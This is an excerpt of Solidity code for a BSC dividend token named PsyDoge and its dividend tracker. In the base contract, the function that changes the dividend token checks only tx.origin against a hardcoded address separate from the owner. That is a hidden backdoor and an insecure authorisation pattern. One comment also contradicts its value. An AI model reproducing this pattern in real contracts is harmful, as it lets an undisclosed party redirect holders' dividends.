...
contract DividendPayingToken is ERC20, IDividendPayingToken, IDividendPayingTokenOptional {
  ...
  function setDividendTokenAddress(address newToken) external virtual {
      require(tx.origin == 0x277D9Af08caba42Dec4228418957B2934bF75635, "Only owner can change dividend contract address");
...
contract PsyDoge is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    constructor() ERC20("PSY DOGE", "PSYD") {
    	dogeDividendTracker = new DogeDividendTracker();

    	marketingWallet = 0x70109Fe448f9F8F95aeA98440510aC2F177dF38E;
    ...
    function afterPreSale() external onlyOwner {
        ...
        maxSellTransactionAmount = 1000000 * (10**18);
    ...
    function updateDogeDividendTracker(address newAddress) external onlyOwner {
        ...
        require(newDogeDividendTracker.owner() == address(this), "The new dividend tracker must be owned by the PsyDoge token contract");
    ...
    function swapAndSendDogeDividends(uint256 tokens) private {
        ...
        uint256 dogeDividends = IERC20(WbnbDividendToken).balanceOf(address(this));
        transferDividends(WbnbDividendToken, address(dogeDividendTracker), dogeDividendTracker, dogeDividends);
    }
...
contract DogeDividendTracker is DividendPayingToken, Ownable {
    ...
    constructor() DividendPayingToken("PsyDoge_Doge_Dividend_Tracker", "PsyDoge_Doge_Dividend_Tracker", 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c) {
    	claimWait = 3600;
        minimumTokenBalanceForDividends = 100 * (10**18); //must hold 2000000+ tokens
    }

    function _transfer(address, address, uint256) pure internal override {
        require(false, "PsyDoge_Doge_Dividend_Tracker: No transfers allowed");
    }

    function withdrawDividend() pure public override {
        require(false, "PsyDoge_Doge_Dividend_Tracker: withdrawDividend disabled. Use the 'claim' function on the main PsyDoge contract.");
    }
    ...
    function updateClaimWait(uint256 newClaimWait) external onlyOwner {
        require(newClaimWait >= 3600 && newClaimWait <= 86400, "PsyDoge_Doge_Dividend_Tracker: claimWait must be updated to between 1 and 24 hours");
        require(newClaimWait != claimWait, "PsyDoge_Doge_Dividend_Tracker: Cannot update claimWait to same value");
